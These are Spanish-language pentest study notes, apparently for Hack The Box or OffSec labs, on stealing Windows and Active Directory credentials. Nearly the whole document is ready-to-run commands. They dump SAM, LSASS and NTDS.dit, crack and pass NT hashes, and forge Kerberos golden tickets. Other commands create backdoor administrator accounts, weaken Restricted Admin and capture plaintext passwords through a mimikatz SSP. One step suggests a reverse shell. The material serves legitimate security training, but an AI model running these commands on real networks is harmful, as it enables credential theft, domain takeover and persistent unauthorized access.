#Windows #bruteforce #passthehash #pastheticket #passthekey #dumpCredentials 
# Técnicas para Dumpear Credenciales

## 1. Dumpeando SAM
Sirve principalmente para obtener credenciales de cuentas locales (sistemas no unidos a un AD). El valor que obtendremos aquí será el NT hash. Con el NT hash (o hash NTML) no importa si nos autenticamos utilizando el protocolo NTMLv1 ó NTMLv2. Si un usuario reutiliza esta contraseña en un AD, también se podrá hacer PtH en el AD. Debemos ser usuarios privilegiados en el sistema para poder realizar este tipo de ataque
### Desde la máquina comprometida
#### Guardar información con `reg.exe` - Máquina comprometida
```powershell
reg.exe save hklm\sam C:\Users\public\sam.save
reg.exe save hklm\system C:\Users\public\system.save
reg.exe save hklm\security C:\Users\public\security.save # opcional
```
- Con esta información debemos utilizar después `secretsdump` del siguiente modo: 
	```bash
	impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL > secretsdump.txt
	```
#### Coon mimikatz
```powershell
.\mimikatz.exe privilege::debug lsadump::sam exit > dumpSAM
# A veces hay que elevar privilegios con token::elevate antes de lsamdump::sam
```
### Desde pwnbox
#### Con `nxc`
```bash
nxc smb $target -u <usuario> -p <contraseña> --sam
```
#### Con impacket
```bash
impacket-secretsdump <user>:<pass>@$target
```

---

## 2. Dumpeando LSASS
Se puede obtener información como la que sigue: 
- Hashes NTML
- Contraseñas en texto claro 
- Tickets Kerberos (TGT y Service Tickets)
- Credenciales cacheadas
- Credenciales RDP
- ...

### Obtener lsass.dmp
#### Task Manager
1. Abrir `Task Manager` > Tab `Processes` > Clic derecho en `LSASS.exe`.
2. Seleccionar `Create Dump File`.

#### Rundll32.exe
1. Encontrar el PID de LSASS:
   - Con `cmd`:
     ```cmd
     tasklist /svc | findstr lsass
     ```
   - Con PowerShell:
     ```powershell
     Get-Process lsass
     ```
2. Crear el volcado:
   ```powershell
   rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
   ```

### Analizar el archivo  `lsass.dmp` con `pypykatz`
```
pypykatz lsa minidump /path/to/lsass.dmp
```

### Mimikatz
Utilizando `seurlsa::logonpasswrods` podemos acceder al proceso activo de LSASS y nos puede dar más información que el paso anterior
```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
# o volcando la información en un archivo
.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit> output.txt
```
### Mitigación credentialGuard - Obtención de credenciales en texto plano
Cuando este está activado, no podemos recuperar los hashes de memoria. Solo está pensado para proteger a usuarios no locales
- Comprobación de si está activado
	```powershell
	Get-ComputerInfo
	```
- El comando `misc::memssp` en Mimikatz instala un "Security Support Provider" (SSP) personalizado en memoria, lo que permite capturar credenciales en texto plano antes de que sean protegidas por Credential Guard. Esto solo tendrá efecto para los usuarios que se logueen a posteriori. Con acceso de administrador debemos ejecutar
	```powershell
	mimikatz.exe "privilege::debug" "misc::memssp" exit
	```
	Guardando la información de los usuarios que se logueen en:
	```powershell
	type C:\Windows\System32\mimilsa.log
	```


---

## 3. Dumpeando NTDS.dit

Se muestra a continuación una tabla de la información que se puede extraer de NTDS y diferencias y similitudes con el voldado LSASS

| 🎯 **Información**                    | 🔍 **Volcado de LSASS**             | 📂 **NTDS.dit**           |
| ------------------------------------- | ----------------------------------- | ------------------------- |
| **Acceso al DC**                      | ❌ No                                | ✅ Sí                      |
| **Privilegios de administrador**      | ✅ Sí                                | ✅ Sí                      |
| **Tickets Kerberos (TGTs y Service)** | ✅ Sí                                | ❌ No                      |
| **Contraseñas en texto claro**        | ✅ En ciertos escenarios             | ❌ No                      |
| **Tokens de sesión activos**          | ✅ Sí                                | ❌ No                      |
| **Hashes NTLM**                       | ✅ Sí                                | ✅ Sí                      |
| **Hashes Kerberos (KRBTGT)**          | ✅ Sí                                | ✅ Sí                      |
| **Estructura del dominio**            | ❌ No                                | ✅ Sí                      |
| **Historial de contraseñas**          | ❌ No                                | ✅ Sí (si está habilitado) |
| **Relaciones de confianza (Trusts)**  | ❌ No                                | ✅ Sí                      |
| **Credenciales de sesión remota**     | ✅ Sí (RDP u otras sesiones activas) | ❌ No                      |

### Con VSS (Volume Shadow Copy) - Localmente
1. Crear una copia de la unidad C:
   ```
   vssadmin create shadow /For=C:
   ```
2. Copiar el archivo:
   ```
   cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
   ```

### Con `nxc` - Remotamente
```
nxc smb $target -u user -p password --ntds
```

---

# Ataques Posteriores

## 1. Fuerza Bruta sobre Hashes NT
Puede tener sentido para reutilizar contraseñas posteriormente en otros servicios  o si hay políticas que bloquean Pth
### Extraer NTLM hashes de `secretsdump.txt`
Suponiendo que el archivo `secretsdump.txt` es
```bash
#Todos los hashes
grep -oP '(?<=aad3b435b51404eeaad3b435b51404ee:)[a-f0-9]{32}' secretsdump.txt > hashes.txt 
# hash de Administrator sin salto de línea al final
cat secretsdump.txt| grep Administrator | grep -oP '(?<=aad3b435b51404eeaad3b435b51404ee:)[a-f0-9]{32}' | tr -d '\n'> hashAdmin
```

### Fuerza bruta con `hashcat`
```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 2. Pass-the-Hash (PtH)
### Con `mimikatz`
```powershell
#privilege::debug
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd.exe
	\Desktop
# Estaremos autenticados como el usuario en el e: 
type \\DC01\C$\Users\Administrator\Desktop\flag.txt
```

#### Con `Invoke-TheHash`
 Ejecuta comandos en un sistema remoto a través de protocolos como SMB (`Invoke-SMBExec`) o WMI (`Invoke-WMIExec`). Se puede poner como `target` la dirección IP o el nombre del dispositivo
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1 
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
En la práctica, como comando se puede envíar una revshell en powershell de [revshells](https://www.revshells.com/) (`PowerShell #3 Base64` )
### Desde pwnbox

#### Con `evil-winrm`
```bash
evil-winrm -i $target -u Administrator -H <NTLM_hash>
```

#### Con `impacket-psexec` - SMB
Por la naturaleza de psexec se obtiene una shell con privilegios de `system`
```bash
impacket-psexec administrator@$target -hashes :<NTLM_hash>
```
#### Con `impacket-wmiexec` - SMB
Se ejecuta una shell con privilegios del usuario que la lanza
```bash
impacket-wmiexec administrator@$target -hashes :<NTLM_hash>
```
#### Con `nxc`
```bash
nxc smb $target -u Administrator -H <NTLM_hash> -x "whoami"
```
#### Con smbclient
```bash
smbclient \\\\$target\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
#### Con `xfreerdp`
```bash
xfreerdp  /v:$target /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
Esto normalmente no funcionará, ya que por defecto hay un `Restricted Admin Mode` habilitado. 
##### Habilitar `Restricted admin mode`
Debemos cambiar un valor del registro para que podamos obtener acceso: 
```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
##### Valor de la clave `LocalAccountTokenFilterPolicy`
Aún así, por defecto, la clave citada tiene el valor por defecto `0`, lo cual significa que solo la cuenta de Administrador (RID-500) puede realizar tareas administrativas de forma remota
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```
##### Valor de la clave `FilterAdministratorToken`
Por defecto está deshabilitada (valor `0`). Si estuviera habilitada, fallaría el ataque PtH incluso con el usuario administrador
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
```

---
## 3. Pass-the-Ticket (PtT)
Para este tipo de ataque se necesitan extraer tickets de tipo `TGT` ó `Service ticket`. En la práctica trabajaremos con `TGTs`, ya que son más valiosos y si podemos extraer un `Service ticket` es muy probable que podamos extraer también un `TGT`.
### Exportar Tickets
En cualquiera de los casos necesitaremos permisos de administrador
#### Con `Mimikatz`
```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
Los tickets que contienen en el nombre el servicio `krbtgt` son tickets de tipo `TGT`
##### Información del ticket
Podemos ver la información del ticket del siguiente modo
```cmd-session
kerberos::list /ticket:<ruta_al_ticket>.kirbi
```

#### Con `Rubeus`
##### Exportar tickets `.kirbi`
El siguiente comando exporta los archivos **en formato `.kirbi`**
```cmd-session
rubeus.exe dump /export
```
El siguiente comando muestra los tickets en memoria.
##### Exportar tickets base64
También muestra estos tickets **en `base64`**, lo cual nos permitirá cargar tickets con este formato posteriormente
```
rubeus.exe dump /nowrap
```
##### Información del ticket
Podemos ver la información del ticket del siguiente modo
```cmd-session
Rubeus.exe describe /ticket:<ruta_al_ticket>.kirbi
```

### Cargar un Ticket

#### Con `Mimikatz`
```
mimikatz.exe
kerberos::ptt <ticket.kirbi>
```

#### Con `Rubeus`
##### Con `ticket.kirbi`
```
rubeus.exe ptt /ticket:<ticket.kirbi>
```
##### Con ticket base64
```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```


---

## 4. OverPass-the-Hash (PtK)
Para un ataque **OverPass-the-Hash necesitamos 
1. Clave`RC4_HMAC`: Es en esencia el hash NTML del usuario reutilizado como clave Kerberos
2. claves Kerberos `AES256_HMAC` : Derivada de la contraseña del usuario. Preferida en entornos modernos
Esta información se puede obtener del volcado `LSASS` ó de `NTDS.dit`. 

### Extraer Kerberos Keys
#### Mimikatz
```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

### Generar un TGT 
Los ejemplos que se proporcionan a continuación son con una clave `RC4_HMAC`. Si en su lugar tuviéramos una clave  `AES256_HMAC` , en lugar de poner `/rc4:<hash>`, deberíamos poner `/aes256:<clave>`
#### Con Rubeus
```bash
rubeus.exe tgtdeleg /user:<username> /rc4:<NTLM_hash>
```

### Utilizar el TGT
```
rubeus.exe asktgs /ticket:<TGT.kirbi> /service:<service>/<host>
```

### En un solo paso 
#### Con `mimikatz`
Este comando realiza un **OverPass-the-Hash**. Utiliza el hash NTLM (`RC4_HMAC`) para generar credenciales Kerberos, las inyecta en LSASS, y abre un `cmd.exe` autenticado como el usuario objetivo.
```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
#### Con `rubeus`
Similar al comando anterior
```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
---
## Golden ticket 
### Teoría
Cuando se genera un TGT, este se genera con la información del usuario como 
- Identidad del cliente.
- Clave de sesión
- Timestamps (inicio y expiración del ticket).
- Identidad del KDC.
- Flags del ticket (renovable, desplegable...)
- PAC(Privilege Attribute Certificate) incluye información útil para la autorización (privilegios del usuario):
	- SID Usuario
	- SIDs de los grupos
	- Privilegios del usuario
	- Información del a cuenta
	- Timestap (cuando fue creado el PAC)
	- Datos de validación (permite a los  servicios verificar la autenticida del PAC)

El PAC incluye dos firmas: 
- Clave del KDC (`krbtgt`): Para la firma principal del KDC
- Clave del Dominio: Para la firma adicional del DC
El TGT contiene toda la información dada, junto con el PAC firmado. A su vez está firmado por la clave `krbtgt`.
Sin embargo, aunque no tengamos acceso a la clave del Dominio, en la práctica por defecto el KDC no verifica las firmas del PAC en los TGTs, por lo que podemos usar como clave de firma del Dominio la propia `krbtgt`. Para algunos pentesters la clave krbtgt es la **clave más importante del sistema**

![[Pasted image 20241119102616.png]]
### Obtención `krbtgt` (hash NTML de la cuenta `krbtgt`)
Para obetner este hash necesitamos privilegios de **administrador de dominio** o acceso a una cuenta con permisos de **replicación del directorio** (por ejemplo, **DCSync**).
#### Mimikatz (DCSync)
Debemos tener acceso administrativo o privilegios de replicación en el dominio
```cmd-session
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:dominio.local /user:krbtgt
```
#### Desde NTDS.dit
Si tenemos credenciales de acceso administrativo al dc. Podemos hacerlo como se muestra en el apartado de dumpeo ó utilizanodo `secretsdump`
```cmd-session
secretsdump.py -just-dc-user krbtgt@<dc_ip> -outputfile hashes.txt
```
#### Desde LSASS
Con acceso al DC y sin privilegios elevados podríamos conseguir esta información (debemos obtener `lsass.dmp`)
```
mimikatz.exe
sekurlsa::minidump
lsass.dmp sekurlsa::logonpasswords
```

#### Información que debemos extraer
La información que encontraremos es de la siguiente manera
```textplain
`krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60:::`
```
Si tenemos la información de mas hashes en un archivo llamado `hashes.txt`, podemos obtener el hash `krbtgt` del siguiente modo: 
```bash
grep -oP '^krbtgt:\d+:[a-f0-9]{32}:\K[a-f0-9]{32}' hashes.txt
```

### Generar golden ticket
Necesitamos pasar los siguientes parámetros:
- **`/user:Administrator`:** Usuario que quieres suplantar 
- **`/domain:dominio.local`:** Nombre del dominio.
- **`/sid:S-1-5-21-XXXX`:** SID del dominio.
- **`/krbtgt:<hash_krbtgt>`:** Hash NTLM de la cuenta `KRBTGT`.
- **`/groups:512`:** Grupo al que pertenece el usuario (por ejemplo, `512` es el SID de **Domain Admins**).
```powershell
kerberos::golden /user:Administrator /domain:dominio.local /sid:S-1-5-21-XXXX /krbtgt:<hash_krbtgt> /groups:512 /ticket:golden.kirbi
```

### Inyección en memoria del golden Ticket
```powershell
mimikatz.exe kerberos::ptt golden.kirbi
```

---
## Comparaciones
### `OPtH` vs `PtT`

| **Aspecto**                | **OverPass-the-Hash (OPtH)**                                          | **Pass-the-Ticket (PtT)**                                |
| -------------------------- | --------------------------------------------------------------------- | -------------------------------------------------------- |
| **Versatilidad**           | Generas TGTs y puedes solicitar múltiples Service Tickets.            | Limitado al ticket extraído (TGT o Service Ticket).      |
| **Persistencia**           | Más persistente, puedes regenerar tickets si tienes el hash o claves. | Dependes de que el ticket sea válido y no haya caducado. |
| **Riesgo de detección**    | Bajo si usas claves Kerberos modernas (AES).                          | Moderado: reusar un ticket puede levantar alertas.       |
| **Requisitos previos**     | Hash NTLM o claves Kerberos del usuario.                              | Acceso a un ticket ya generado en memoria (LSASS).       |
| **Interacción con el KDC** | Necesaria para generar nuevos tickets.                                | No necesaria si ya tienes el ticket.                     |
### Golden Ticket vs. OPtH

| **Aspecto**             | **OverPass-the-Hash**                                 | **Golden Ticket**                                                                  |
| ----------------------- | ----------------------------------------------------- | ---------------------------------------------------------------------------------- |
| **Requisitos previos**  | Hash NTLM (`RC4_HMAC`) o claves Kerberos (`AES`).     | Hash de la cuenta **KRBTGT** del dominio.                                          |
| **Uso principal**       | Generar un TGT válido para suplantar a un usuario.    | Crear un TGT falsificado con control total (podemos simular ser cualquier usuario) |
| **Dependencia del KDC** | Necesitamos interactuar con el KDC para generar TGTs. | No necesitamos el KDC tras crear el ticket.                                        |
| **Persistencia**        | Limitada: depende de la validez del hash/clave.       | Muy alta: el Golden Ticket no expira (salvo que cambie el hash de KRBTGT).         |
| **Nivel de acceso**     | Limitado al usuario cuyo hash/clave posees.           | Control total del dominio con permisos personalizados.                             |
## Movimientos laterales
Una vez utilizadas las técnicas de opth ó ptt, tendremos las credenciales inyectadas en memoria, por lo que tenemos varias alternativas para movernos lateralmente (en muchas ocasiones tendremos acceso a recursos que no teníamos antes de inyectar las credenciales)
#### PowerShell Remoting (WinRM)
Tras acceder a powershell:
```powershell
Enter-PSSession -ComputerName DC01
```
#### WMI 
Podríamos crear un proceso en el sistema remoto utilizando `process call create`:
```powershell
wmic /node:"DC01" process call create "cmd.exe /c net user hacker Password123 /add"
```
#### SMB
Podríamos tener acceso a recursos en red nuevos: 
```powershell
net use \\DC01\C$
```
#### PsExec con el contexto autenticado
```powershell
PsExec.exe \\DC01 -s cmd.exe
```
#### RDP
```
xfreerdp /v:DC01
```

## Credential Hunting en Windows

### Buscar Credenciales en Archivos
Findstr suele ser más rápido porque es nativo de Windows y está optimizado para
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
findstr /s /i cred n:\*.*
# con más de una palabra a buscar
findstr /SIM /C:"password" /C:"cred" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
# En todos los archivos
findstr /S /I /M /C:"password" /C:"cred" C:\*.* # C:\*. para archivos sin extensión
# powershell
Get-ChildItem -Recurse -Path n:\ | Select-String "cred" -List
# Buscando cualquier palabra que contenga cred o pass
Get-ChildItem -Recurse -Path N:\ | Select-String -Pattern "cred|pass" -List
```
### Buscar archivos 
- Buscar un archivo con un nombre completo
	```powershell
	# Powershell
	Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue
	# Mostrando ruta completa
	Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }
	# Em cmd
	dir C:\ /s /b | findstr "flag.txt" 2> $null
	```
- Que puedan contener credenciales
	```cmd
	dir n:\*cred* /s /b 
	```
- Que puedan contener archivos de configuración o similar
	```powershell
	#cmd: /s de forma recursiva, /p resultados pausando por página
	dir C:\*.config *.json *.yml *.ini *.conf *.env *.txt /s /p
	#powershell
	Get-ChildItem -Path C:\ -Recurse -Include *.config,*.json,*.yml,*.ini,*.conf,*.env,*.txt,*.cnf -ErrorAction SilentlyContinue
	```
- Mostrar todos los archivos que no están vacíos en un directorio (no muestra carpetas)
	```bash
	Get-ChildItem -File -Recurse | Where-Object { $_.Length -gt 0 }
	```
- Buscar archivos keepass (`*.kdbx`), gestor de contraseñas
	```powershell
	Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
	```
- Opción propuesta por offsec para archivos con información sensible en una página web: 
	```powershell
	Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
	# por ejemplo, para buscar la palabra password o credentials dentro de estos archivos podríamos escribir
	findstr /SIM /C:"password" /C:"credential" C:\xampp\*.txt
	# podemos buscar la línea exacta en la que aparece una palabra
	Select-String -Path "C:\xampp\passwords.txt" -Pattern "password"
	# o más contenido alrededor de la palabra password
	Select-String -Path "C:\xampp\passwords.txt" -Pattern "password" -Context 5,5
	# Todos los ejemplos juntos en un oneliner
	findstr /SIM /C:"password" /C:"credential" C:\xampp\*.txt | ForEach-Object { ($_ -replace '^([A-Z]:\\.*?):\d+', '$1') } | Where-Object { Test-Path $_ } | Select-Object -Unique | ForEach-Object { "=== Información en: $_ ===`n" + (Select-String -Path $_ -Pattern "password|credential" -Context 5,5 | Out-String) + "`n--------------------------------------------------`n" } | Out-File .\recolection.txt -Append
	# otro ejemplo con get-childitem
	Get-ChildItem -Recurse -Filter "*config*" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }  | ForEach-Object { "=== Información en: $_ ===`n" + (Select-String -Path $_ -Pattern "password|credential" -Context 5,5 | Out-String) + "`n--------------------------------------------------`n" }
	```
- Otros archivos interesantes (sacado de chuleta)
```powershell
# GPG keys
dir /s /b /a C:\users\*.gpg
# usually under C:\Users\*\AppData\Roaming\gnupg\

# KeePass databases:
dir *.kdb /a /b /s
dir *.kdbx /a /b /s
powershell -c "Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"

# XAMPP config files:
powershell -c "Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue"
# my.ini is MySQL config
# passwords.txt has default creds

# User files
powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
```
### Con `LaZagne`
```cmd
C:\tools> lazagne.exe all
```
### Historial, logs y otros
- Mostrar el historial de la sesión actual
	```powershell
	Get-History
	```
- Mostrar el historial de `PSReadLine` (módulo de autocompletado e historial de comandos persistente)
	```powershell
	# esto solo muestra dónde está guardado, después hay que abrir el archivo
	(Get-PSReadlineOption).HistorySavePath
	# puede ser interesante buscar sobre este archivo ConvertTo-SecureString, set-secret, keepass, -credential, authorization...
	```
- `Powershell transcription` es un es un mecanismo de auditoría que guarda todo lo que se ejecuta en PS en formato de texto.
	```powershell
	# Ubicación cuando está activado por GPO
	C:\Users\<usuario>\Documents\PowerShell_transcript.<hostname>.txt
	# Ubicación cuando está configurado globalemente
	C:\Windows\System32\LogFiles\PowerShell
	# Si lo activa un usuario manualmente, lo activa y desactiva con los siguientes comandos
	Start-Transcript -Path C:\Logs\powershell_transcript.log -Append
	Start-Transcript -Path C:\Users\Public\Transcripts\transcription01.txt -Append
	Stop-Transcript
	```
- `Powershell Scritp Block Logging`: registra todos los scripts ejecutados en PS, incluyendo código dinámico como `IEX`, `DownloadString()`, etc.
	- Ubicación de los logs desde RDP o similar
		```
		Event Viewer → Applications and Services Logs → Microsoft → Windows → PowerShell → Operational (Event ID 4104)
		```
	- Ubicación de los logs desde powershell
		```powershell
		# comprobar si está habilitado. Si lo está la salida será
		Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging
		# EnableScriptBlockLogging : 1 Si está habilitado
		# Ver los scripts ejecutados (ID 4104: evento de Scritp Block Logging)
		Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 }
		# mostrar los scripts ejecutados: 
		Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 } | Select-Object -ExpandProperty Message
		# Exportar los logs
		Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Out-File .\script_block_logs.txt
		```